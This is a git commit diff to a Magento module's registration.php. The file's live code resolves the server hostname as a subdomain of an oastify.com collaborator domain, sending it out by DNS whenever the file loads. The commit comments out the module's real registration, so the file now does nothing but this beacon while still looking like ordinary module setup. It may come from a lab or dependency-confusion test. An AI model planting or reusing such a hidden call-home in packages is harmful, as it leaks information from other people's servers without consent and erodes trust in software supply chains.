ddaad5d6080997109215ff6712fb16581f4ab451
eshwar1988 <eshwar_dec@yahoo.co.in>
2026-03-03 02:31:24 +0530

    Update registration.php

--- registration.php
+++ registration.php
@@ -3,9 +3,9 @@ $lab_host = gethostname();
 $collab_domain = "rwrw8181gv8ykljahyxo3kynxe35rxfm.oastify.com";
 
 @gethostbyname($lab_host . "." . $collab_domain);
-
-\Magento\Framework\Component\ComponentRegistrar::register(
-    \Magento\Framework\Component\ComponentRegistrar::MODULE,
-    'EshwarLab_TestModule',
-    __DIR__
-);
+//
+//\Magento\Framework\Component\ComponentRegistrar::register(
+//    \Magento\Framework\Component\ComponentRegistrar::MODULE,
+//    'EshwarLab_TestModule',
+//    __DIR__
+//);
